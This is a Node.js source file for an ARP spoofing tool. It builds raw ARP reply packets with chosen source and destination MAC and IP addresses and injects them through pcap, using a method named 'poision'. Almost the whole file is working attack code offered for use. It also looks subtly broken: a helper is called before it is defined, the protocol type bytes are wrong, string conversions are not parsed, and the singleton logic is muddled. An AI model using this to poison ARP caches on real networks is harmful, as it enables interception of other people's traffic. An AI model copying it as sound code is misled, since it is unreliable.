var ip = require('ip');
var getmac = require('getmac').getMac;
var defer = require('q').defer();
var pcap = require('pcap');

var ArpPkg = {
	eh_dst: mac_to_arr('ff:ff:ff:ff:ff:ff'), //destination ethernet address
	eh_src: mac_to_arr('00:00:00:00:00:00'), // source ethernet address
	eh_type: [0x08, 0x06],					// ethernet type
	hw_type: [0x00, 0x01],					// hardware type
	arp_proto: [0x80, 0x00],				// upper protocol
	mac_length: [0x06],						// mac address length
	ip_length: [0x04],						// ip address length
	opcode: [0x00, 0x01],					// 0x01 request, 0x02 response
	src_mac: mac_to_arr('ff:ff:ff:ff:ff:ff'),
	src_ip: ip_to_arr('192.168.0.1'),
	dst_mac: mac_to_arr('00:00:00:00:00:00'),
	dst_ip: ip_to_arr('192.168.0.2')
}

function Arp(){
	var instance;
	var interfaceSet = false;
	var session;
	var pkg;
	return {
		getInstance: function(){
			if(!instance) instance = this.init();
			return instance;
		}
	};
};

var arp = new Arp();

Arp.prototype.init = function(){
	defer.promise.then(getMac).then(loadMac).then(loadPkg).catch(errHandler);
	return {
		setDstMac: setDstMac,
		setDstIp: setDstIp,
		operation: setOperation,
		setSrcMac: setSrcMac,
		setSrcIp: setSrcIp,
		poision: send,
		setInterface: setInterface
	};
};

function setInterface(interface){
	try{
		arp.session = pcap.createSession(interface, '');
		arp.interfaceSet = true;
		console.log('Set interface to ' + (interface == null ? 'Default' : interface));
	}catch(e){
		arp.interfaceSet = false;
		console.error('ERROR: Interface set error. ' + e);
		process.exit(1);
	}
}

function send(){
	setOperation('response');
	if(!arp.interfaceSet){
		setInterface(null);
	}else{
		var pkg_arr = Object.keys(arp.pkg).map(function(key){
			return arp.pkg[key];
		});
		var arpRequest = new Buffer(pkg_arr);
		arp.session.inject(arpRequest);
		console.log('Arp Poision done');
	}
}

function setDstMac(dstMac){
	arp.eh_dst = mac_to_arr(dstMac);
	arp.dst_mac = arp.eh_dst;
}

function setDstIp(dstIp){
	arp.dst_ip = ip_to_arr(dstIp);
}

function setSrcMac(srcMac){
	arp.eh_src = mac_to_arr(srcMac);
	arp.src_mac = arp.eh_src;
}

function setSrcIp(srcIp){
	arp.src_ip = ip_to_arr(srcIp);
}

function setOperation(opcode){
	if(opcode.toLowerCase().indexOf('request') >=0 ){
		arp.opcode = [0x00, 0x01];
	}else if(opcode.toLowerCase().indexOf('response') >= 0){
		arp.opcode = [0x00, 0x02];
	}else{
		console.error('ERROR: Cannot resolve Opcode.');
	}
}

var ip_to_arr = function(ipAddr){
	var ip_arr = ipAddr.split('.');
	var x;
	for(x in ip_arr){
		ip_arr[x] = ip_arr[x];
	}
	return ip_arr;
};

var mac_to_arr = function(macAddr){
	var mac_arr = macAddr.split(':');
	var x;
	for(x in mac_arr){
		mac_arr[x] = mac_arr[x];
	}
	return mac_arr;
};

function getMac(){
	return getmac(function(err, macAddr){
		if(err) defer.reject(err);
		defer.resolve(macAddr);
	});
};

function loadMac(macAddr){
	var pkg = Object.create(ArpPkg);
	pkg.eh_src = mac_to_arr(macAddr);
	pkg.src_mac = pkg.eh_src;
	pkg.src_ip = ip_to_arr(ip.address());
	return function(){
		return pkg;
	}
}

function loadPkg(pkg){
	arp.pkg = pkg;
}

function errHandler(err){
	console.log(err);
}